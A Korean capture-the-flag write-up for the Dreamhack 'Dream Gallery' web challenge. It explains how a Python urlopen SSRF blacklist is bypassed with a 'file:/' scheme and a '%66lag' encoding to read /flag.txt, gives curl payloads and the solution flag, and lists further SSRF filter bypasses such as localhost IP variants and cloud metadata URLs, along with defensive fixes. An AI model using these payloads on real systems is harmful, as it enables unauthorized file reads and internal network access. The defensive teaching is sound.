---
layout: post
title:  "Dreamhack 워게임 Dream Gallery 풀이 — file:/ 스킴과 %66 인코딩으로 SSRF 블랙리스트 한 방에 우회"
date:   2026-05-16 11:00:00 +0900
categories: security web wargame dreamhack writeup ssrf python
---

## 들어가며

Dreamhack 웹해킹 워게임 **Dream Gallery** (난이도 Unrated) 풀이입니다. "갤러리 사이트의 외부 요청 기능이 안전한지 모르겠다" 는 친절한 힌트 그대로, **Python `urlopen` 의 SSRF + 블랙리스트의 두 가지 빈틈** 을 보여주는 사이버보안 입문 문제입니다.

문제 설명:

> 드림이는 갤러리 사이트를 구축했습니다. 그런데 외부로 요청하는 기능이 안전한 건지 모르겠다고 하네요...
> flag는 `/flag.txt`에 있습니다.

스포일러 — `curl` 두 줄로 끝납니다.

```bash
# 1) 파일을 SSRF 로 base64 저장
curl -G "$SERVER/request" \
  --data-urlencode 'url=file:/%66lag.txt' \
  --data-urlencode 'title=flagme'

# 2) /view 페이지에서 그 title 의 base64 디코딩 → flag
curl -s "$SERVER/view" | python3 ... base64decode ...
# → DH{b2037a026b40cc98804e91b5a2a07f54}
```

핵심 트릭 두 개:

1. **`file://`** 는 블랙리스트지만 **`file:/`** (single slash) 는 통과.
2. **`flag` 단어** 도 블랙리스트지만 **`%66lag`** 처럼 한 글자만 URL 인코딩하면 통과 — 그리고 `urlopen` 의 file handler 가 path 를 URL-디코딩해서 실제로는 `flag.txt` 를 연다.

> Note: 사이버보안 입문 학습용 PoC. 실제 운영 서비스 대상 사용 금지.

## 1. 소스 정독

```python
from urllib.request import urlopen

@app.route('/request')
def url_request():
    url = request.args.get('url', '').lower()
    title = request.args.get('title', '')
    if url == '' or url.startswith("file://") or "flag" in url or title == '':
        return render_template('request.html')

    try:
        data = urlopen(url).read()
        mini_database.append({title: base64.b64encode(data).decode('utf-8')})
        return redirect(url_for('view'))
    except:
        return render_template("request.html")
```

핵심 4개 줄이 곧 4개의 함정:

1. **`url.lower()`** — 대소문자 우회는 막힘. `FILE://` 같은 트릭 불가.
2. **`url.startswith("file://")`** — 정확히 `file://` (콜론 + 슬래시 둘) 로 시작하는 경우만 차단. `file:` 하나 또는 `file:///` 셋도 처리하지 않음. **`file:/path` 형태가 검사를 통과**.
3. **`"flag" in url`** — substring 검사. 글자 한 개만 URL 인코딩해서 substring 을 깨면 통과.
4. **`urlopen(url)`** — `file:`, `ftp:`, `http:`, `https:` 모두 지원. 그리고 **path 부분을 URL 디코딩** 한 뒤 실제 파일 시스템 경로로 변환.

### 1-1. `file://` vs `file:/` vs `file:///`

RFC 3986 의 URL 일반 형식은 `scheme:[//authority]path`. file scheme 은 보통 세 가지로 쓴다:

- `file://host/path` — 완전한 형식 (host 부분 있음)
- `file:///path` — host 가 빈 문자열 (가장 흔함)
- `file:/path` — host 부분이 아예 없음 (RFC 3986 의 "path-absolute" 형식)

Python 의 `urllib.request.urlopen` 은 세 형식 모두 받아들여서 **`/path` 로 해석** 한다. 즉 의미상 동일.

블랙리스트는 `startswith("file://")` 만 검사하므로 `file:/X` 와 `file:///X` 두 변형 모두 우회 가능. (`file:///X` 는 `.startswith("file://")` 에 걸린다. `file:/X` 는 안 걸린다.)

### 1-2. `urlopen` 의 file handler 가 path 를 URL-디코딩한다

Python `urllib.request.FileHandler.file_open` 내부:

```python
def open_local_file(self, req):
    import email.utils, mimetypes, os, socket
    host = req.host
    filename = req.selector
    localfile = url2pathname(filename)
    ...
```

`url2pathname` 은 `%XX` 인코딩을 디코딩한다. 즉:

```
file:/%66lag.txt
↓
selector = "/%66lag.txt"
↓ url2pathname
"/flag.txt"
↓
open("/flag.txt")
```

`%66` 은 `f` 의 16진. 한 글자만 인코딩해도 substring 검사를 깬다. (다른 글자 — `%6c`(l), `%61`(a), `%67`(g) — 도 같은 효과.)

## 2. 페이로드 한 줄

```bash
SERVER=http://<host>:<port>
curl -G "$SERVER/request" \
  --data-urlencode 'url=file:/%66lag.txt' \
  --data-urlencode 'title=flagme'
```

각 검사 통과 확인:

| 검사                        | 입력 (`url.lower()` 적용 후)  | 결과   |
|-----------------------------|-------------------------------|--------|
| `url == ''`                 | `file:/%66lag.txt`            | ✓ 통과 |
| `url.startswith("file://")` | 정확히 `file:/` 한 슬래시      | ✓ 통과 |
| `"flag" in url`             | `file:/%66lag.txt` — substring "flag" 없음 (`%66lag` 에는 `f` 자리에 `%66`) | ✓ 통과 |
| `title == ''`               | `flagme`                       | ✓ 통과 |

`urlopen` 이 `file:/%66lag.txt` 를 열어 `/flag.txt` 의 내용을 읽고, base64 로 인코딩해서 `mini_database` 에 `{"flagme": "..."}` 로 저장. `/view` 페이지에 우리가 추가한 entry 가 노출됨.

## 3. flag 추출

`/view` 는 `mini_database` 의 모든 항목을 `<img src="data:image/png;base64,XXX">` 형태로 갤러리에 표시. 우리가 넣은 title="flagme" 에 해당하는 entry 의 base64 만 추출해서 디코딩.

```bash
curl -s "$SERVER/view" -o /tmp/view.html
python3 << 'EOF'
import re, base64
html = open('/tmp/view.html').read()
entries = re.findall(r'base64,([^"]+)".*?text-center">([^<]+)</div>', html, re.DOTALL)
for data, title in entries:
    if 'flag' in title.strip().lower():
        print('Decoded:', base64.b64decode(data)[:300])
EOF
# → Decoded: b'DH{b2037a026b40cc98804e91b5a2a07f54}'
```

flag: `DH{b2037a026b40cc98804e91b5a2a07f54}` ✓

## 4. 취약점 해설 — Blacklist + Parser Differential

### 4-1. SSRF 의 일반 패턴

이 클래스는 항상 **두 컴포넌트의 파싱 차이** 에서 나온다.

- **검증기** (블랙리스트의 `startswith`, `in`, substring 비교 등) 는 **표면 문자열** 만 본다.
- **실행기** (`urlopen`, `requests.get`, `curl`, 등) 는 **URL 표준** 에 따라 다양한 표기를 같은 의미로 해석한다.

이 둘이 다르므로, 검증기를 우회하면서 실행기는 우리가 원하는 자원으로 가도록 만들 수 있다.

이번 문제의 두 차이:

1. **scheme 표기 차이** (`file://` vs `file:/` vs `file:///`) — 검증기는 정확히 두 슬래시만 보고, 실행기는 셋 다 같은 의미로 해석.
2. **URL percent-encoding** (`flag` vs `%66lag`) — 검증기는 raw 문자열로 substring 검사, 실행기는 URL 디코드 후 실제 path 로 사용.

### 4-2. 같은 카테고리의 실무 사례

- **SSRF 가드를 `if 'http' in url:` 으로 짜는 케이스** — `http%3A` 같은 인코딩으로 우회.
- **`startswith('http://')` 검증** — `http:///` (트리플 슬래시), `http:\\` 등으로 우회.
- **`url.contains('localhost')` 검증** — `127.0.0.1`, `0`, `2130706433`, `0x7f000001` 등 IP 표기 변형으로 우회.
- **AWS metadata 차단** — `169.254.169.254` 만 차단하고 `0` (= 0.0.0.0 = localhost) 또는 IPv6 `[fd00:ec2::254]` 같은 변형을 빠뜨려 메타데이터 노출.

### 4-3. 위험성

- 이번 문제는 `file:` 로 임의 파일 읽기지만, 같은 패턴으로 내부 admin endpoint (`http://127.0.0.1:81/admin`), 클라우드 메타데이터 (`http://169.254.169.254/latest/meta-data/`), 내부 Redis (`gopher://`) 등 모든 SSRF 페이로드가 가능.
- "blacklist + lower()" 같은 가벼운 검증은 거의 항상 우회 가능. 보안 효과 ≈ 0.

### 4-4. 올바른 방어

1. **블랙리스트 대신 화이트리스트**: 허용된 scheme/host 만 통과.

   ```python
   from urllib.parse import urlparse
   p = urlparse(url)
   if p.scheme not in ('http', 'https'): reject()
   if p.hostname not in ALLOWED_HOSTS: reject()
   if p.username or p.password: reject()
   ```

2. **`urlopen` 대신 `requests`** + 명시적 timeout, allow_redirects 검증, IP 화이트리스트.

3. **`file:` scheme 자체를 차단**. Python 의 `urllib.request` 는 default 로 `FileHandler` 가 포함되어 있다. 필요 없으면 `build_opener()` 로 file handler 를 빼고 쓰자.

   ```python
   import urllib.request
   opener = urllib.request.build_opener(
       urllib.request.HTTPHandler,
       urllib.request.HTTPSHandler,
   )
   urllib.request.install_opener(opener)
   ```

4. **검증을 URL 디코딩 후에 한 번 더**. 다만 디코딩 후 검사도 인코딩 변형 (double-encoded, unicode 등) 으로 우회될 수 있어 **화이트리스트** 가 결국 답.

5. **요청 결과의 사용처에서도 검증**. 외부 URL 의 응답이 그대로 사용자에게 보이지 않게.

## 5. 정리 — 입문자가 가져갈 교훈

- SSRF 검증 = **블랙리스트 + substring** 형태면 거의 100% 우회 가능. **scheme 표기, IP 표기, encoding** 의 3종 세트만 떠올려도 우회 후보가 한 두 줄로 나온다.
- Python `urlopen` 의 **`file:` scheme 지원** 은 자주 잊혀지는 가장 흔한 footgun. 외부 입력을 받는 곳에서 `urlopen` 을 쓰면 file SSRF 부터 의심.
- URL percent-encoding (`%XX`) 은 substring 검사를 깨는 가장 짧은 우회. 한 글자만 인코딩해도 충분.
- 화이트리스트 + 명시적 scheme/host 체크 + handler 제거 — 세 가지가 SSRF 의 기본 방어.

같은 카테고리의 다음 단계로 **crawling (이미 풀음 — open redirector SSRF)**, **curling (이미 풀음 — userinfo 트릭)**, **SSRF Advanced (DNS rebinding)** 를 풀어보면 좋습니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. `file://` 의 substring 길이를 잠깐 헷갈림

처음에 `file:///flag.txt` (트리플 슬래시) 로 시도. **`startswith("file://")` 에 그대로 걸린다**. file:// 는 정확히 두 슬래시지만, 트리플 슬래시도 그 두 슬래시로 시작하니까 검사 통과 못 함.

해결: `file:/` (싱글 슬래시) — 트리플도 더블도 둘다 시작이 `file://` 인 반면, 싱글은 `file:/` 한 슬래시뿐.

**회고**: `startswith` 검사를 우회할 때는 **검사 문자열보다 짧거나** **검사 문자열의 prefix 가 아닌** 문자열을 만들자. 트리플은 검사 문자열의 superset 이므로 안 통한다.

### 실패 2. URL 인코딩이 file handler 에서 디코딩되는지 잠깐 의심

처음에 `file:/%66lag.txt` 가 정말 `/flag.txt` 를 여는지 확신 못 함. `urlopen` 의 file handler 소스 (`urllib/request.py` 의 `FileHandler.file_open` → `url2pathname`) 를 확인해서 percent decoding 이 일어남을 확인.

**회고**: Python 표준 라이브러리는 항상 소스가 있다. `python3 -c "import urllib.request; print(urllib.request.__file__)"` 로 위치 찾고 직접 읽으면 5초. 추측보다 빠르고 정확하다.

### 실패 3. base64 추출 정규식이 처음에 너무 좁음

`/view` 페이지의 HTML 에서 base64 와 title 을 추출할 때, 처음에 좁은 정규식 `<img[^>]*data:image/png;base64,(.*?)"[^>]*alt="(.*?)"` 로 시도. 실제 페이지는 img 와 title 이 다른 div 에 분리되어 있어 매칭 실패.

해결: `re.search` 로 큰 패턴 (base64 → 다음에 등장하는 text-center div) 를 잡고, title 이 "flag" 를 포함하는 것만 필터.

**회고**: HTML 파싱은 항상 **lxml/BeautifulSoup** 가 정공법. 정규식은 빠르지만 페이지 구조가 조금만 달라도 깨진다. PoC 일회용 코드에서도 가능하면 정식 파서.

### 실패 4. 처음에 webhook + http SSRF 로 가려고 함

처음 SSRF 라는 단어를 보고 본능적으로 "webhook 으로 콜백 받자" 를 떠올림. 하지만 이 문제는 **응답을 base64 로 저장** 해서 사용자에게 노출하므로, 더 단순하게 **응답 본문 자체를 받으면** 끝. webhook 불필요.

**회고**: SSRF 의 데이터 channel 이 무엇인지 먼저 정의. (a) 응답 본문 노출 → 그냥 GET, (b) 응답 노출 X but DNS/connect → blind SSRF, OOB 필요. (a) 인 경우 webhook 같은 외부 인프라 안 써도 됨.
